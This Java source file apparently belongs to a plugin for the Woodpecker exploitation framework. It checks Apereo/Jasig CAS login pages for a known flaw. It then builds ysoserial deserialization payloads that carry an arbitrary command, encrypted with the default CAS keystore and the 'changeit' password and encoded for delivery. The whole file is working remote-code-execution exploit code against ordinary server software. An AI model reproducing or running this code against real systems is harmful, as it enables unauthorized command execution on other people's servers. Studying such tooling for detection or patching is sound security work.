package me.gv7.woodpecker.plugin;

import me.gv7.woodpecker.plugin.payloads.CasPayloadGenerate;
import net.dongliu.requests.Requests;
import org.cryptacular.bean.BufferedBlockCipherBean;
import org.cryptacular.bean.KeyStoreFactoryBean;
import org.cryptacular.generator.sp80038a.RBGNonce;
import org.cryptacular.io.URLResource;
import org.cryptacular.spec.BufferedBlockCipherSpec;
import org.cryptacular.util.CodecUtil;
import org.jasig.spring.webflow.plugin.EncryptedTranscoder;
import org.python.modules._marshal;
import ys.payloads.ObjectPayload;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.URL;
import java.net.URLEncoder;
import java.security.KeyStore;
import java.util.zip.GZIPOutputStream;

public class CasCommonUtils {

    public static String checkUrl(String url){
        if (!url.contains("cas/login")){
            if (url.endsWith("/")){
                return url+  "cas/login";
            }else {
                return url + "/cas/login";
            }
        }
        return url;
    }

    public static boolean basicCheckVuln(String targetURL, IResultOutput result){
        String s = Requests.get(targetURL).verify(false).send().readToText();
        if (s.contains("_AAAA")){
            return true;
        }else if (s.contains("s1\"")){
            result.errorPrintln("目标不存在漏洞！");
        }else if (s.contains("_ZXlK")){
            result.errorPrintln("有源码请手动分析key来利用");
        }
        return false;
    }

    public static boolean basicCheckVuln(String targetURL){
        String s = Requests.get(targetURL).verify(false).send().readToText();
        return s.contains("_AAAA");
    }

    public static String generate(String className, String command){
        try {
            // 解决: java.lang.RuntimeException: StubTransletPayload: frozen class (cannot edit) 错误
            try{
                javassist.ClassPool.getDefault().getCtClass("StubTransletPayload").defrost();
            }catch (javassist.NotFoundException e){
            }
            Object o = ObjectPayload.Utils.makePayloadObject(className, command);
            //EncryptedTranscoder transcoder = new EncryptedTranscoder();
            //byte[] aesEncoded = transcoder.encode(o);
            byte[] aesEncoded = CasCommonUtils.encoder(o);
            String b64Encoded = CodecUtil.b64(aesEncoded);
            String output = "67554b79-6cc1-4d89-a933-e99eb21a0ac2_"+b64Encoded;
            return URLEncoder.encode(output);
        }catch (Exception e){
            CasPayloadGenerate.iResultOutput.errorPrintln(CasRCE.pluginHelper.getThrowableInfo(e));
            return e.getMessage();
        }
    }

    public static byte[] encoder(Object o){
        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));
        bufferedBlockCipherBean.setKeyStore(CasCommonUtils.createAndPrepareKeyStore());
        bufferedBlockCipherBean.setKeyAlias("aes128");
        bufferedBlockCipherBean.setKeyPassword("changeit");
        bufferedBlockCipherBean.setNonce(new RBGNonce());

        if (o == null) {
            return new byte[0];
        } else {
            ByteArrayOutputStream outBuffer = new ByteArrayOutputStream();
            try (ObjectOutputStream out = new ObjectOutputStream(new GZIPOutputStream(outBuffer))) {
                out.writeObject(o);
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                return bufferedBlockCipherBean.encrypt(outBuffer.toByteArray());
            } catch (Exception ignore) {
                return new byte[0];
            }
        }
    }

    protected static KeyStore createAndPrepareKeyStore() {
        KeyStoreFactoryBean ksFactory = new KeyStoreFactoryBean();
        URL u = CasCommonUtils.class.getClassLoader().getResource("etc/keystore.jceks");
        assert u != null;
        ksFactory.setResource(new URLResource(u));
        ksFactory.setType("JCEKS");
        ksFactory.setPassword("changeit");
        return ksFactory.newInstance();
    }
}
